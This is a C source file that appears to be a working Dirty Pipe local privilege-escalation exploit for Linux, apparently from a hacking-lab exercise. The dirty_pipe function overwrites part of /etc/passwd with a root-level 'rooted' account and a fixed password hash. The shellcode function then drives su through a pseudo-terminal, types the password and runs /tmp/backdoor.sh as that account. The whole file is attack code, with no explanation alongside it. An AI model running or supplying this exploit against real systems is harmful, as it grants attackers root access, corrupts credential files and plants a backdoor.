#define _GNU_SOURCE
#define _XOPEN_SOURCE 600
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h> // manipulate file  descriptor
#include <string.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <pty.h>

#define PAGE_SIZE 4096

void prepare_pipe(int* pipe_fd) {
	// initialize the pipe
	if (pipe(pipe_fd) != 0) {
		exit(1);
	}

	// fill the pipe -> this will set buffer as mergeable
	unsigned int pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
	char buffer[4096];
	memset(buffer, 'a', sizeof(buffer));
	for (int i = 0; i < pipe_size; i += sizeof(buffer)) {
		write(pipe_fd[1], buffer, sizeof(buffer));
	}

	for (int i = 0; i < pipe_size; i += sizeof(buffer)) {
		read(pipe_fd[0], buffer, sizeof(buffer));
	}
}

int dirty_pipe() {
	char* path = "/etc/passwd";
	char* payload = "rooted:$6$THM$t.z7US0R.Yh75LYpryEUphgN0OtaNfD.pWyuFUsNlDJLfNaWHuFz9oTGv/s6TpdNh9SJ0LtRccgt/4PFP6RKP/:0:0:Rooted User:/root:/bin/bash\n";
	size_t payload_size = strlen(payload);
	loff_t offset = 32;

	if (offset % PAGE_SIZE == 0) {
		return -1;
	}

	loff_t next_page = (offset | (PAGE_SIZE -1)) + 1;
	loff_t end_offset = offset + (loff_t)payload_size;

	if (end_offset > next_page) {
		return -1;
	}

	int fd = open(path, O_RDONLY);
	if (fd < 0) {
		return -1;
	}
        lseek(fd, 0, SEEK_SET);
        char buf[4096] = {0};

	lseek(fd, 0, SEEK_SET);

	struct stat st;
	if (fstat(fd, &st)) {
		return -1;
	}

	if (offset > st.st_size) {
		return -1;
	}

	if (end_offset > st.st_size) {
		return -1;
	}

	int pipefd[2];
	prepare_pipe(pipefd);
	--offset;
	if (splice(fd, &offset, pipefd[1], NULL, 1, 0) < 0) {
		return -1;
	}

    	if (write(pipefd[1], payload, payload_size) != payload_size) {
        	return -1;
    	}

    	close(fd);
    	close(pipefd[0]);
    	close(pipefd[1]);
	return 0;
}

int shellcode() {
	int master;
	pid_t pid = forkpty(&master, NULL, NULL, NULL);
	if (pid == -1) {
		return -1;
	}
	if (pid == 0) {
		// this is the child process
		execlp("su", "su", "-c", "bash /tmp/backdoor.sh", "rooted", NULL);
		return -1;
	} else {
		// this is the father process
		char buffer[1024];
		int n;

		// read until "Password:"
		while ((n = read(master, buffer, sizeof(buffer) - 1)) > 0) {
		    buffer[n] = '\0';

		    if (strstr(buffer, "Password:") != NULL) {
		        // enter the password
		        char* password = "rooted\n";
		        write(master, password, strlen(password));
		        break;
		    }
		}
		waitpid(pid, NULL, 0);
    	}
	return 0;
}

int main() {
	if (dirty_pipe() < 0) {
		exit(1);
	}
	if (shellcode() < 0) {
		exit(1);
	}
}
